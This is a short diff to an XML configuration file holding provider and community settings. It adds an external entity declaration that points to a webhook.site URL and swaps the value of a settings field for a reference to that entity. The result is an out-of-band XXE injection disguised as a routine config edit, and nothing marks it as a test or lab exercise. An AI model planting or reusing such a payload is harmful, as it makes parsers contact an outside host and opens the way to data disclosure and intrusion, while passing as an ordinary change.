@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
- <root>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://webhook.site/a5fc1101-baa0-46d1-95bd-cc3af40cda1b/xxe"> ]>
+<root>
      <providers>
          <LinkedIn>
              <canonicalName>LinkedIn</canonicalName>
@@ -125,7 +126,7 @@
          </coverImage>
      </communityTheme>
      <parameters>
-         <allowAnonymousNewsFeedAccess>false</allowAnonymousNewsFeedAccess>
+         <allowAnonymousNewsFeedAccess>&xxe;</allowAnonymousNewsFeedAccess>
          <allowImageSubmission>Enabled</allowImageSubmission>
          <allowUsersToCategorizePosts>Disabled</allowUsersToCategorizePosts>
          <allowUsersToTagPosts>Disabled</allowUsersToTagPosts>
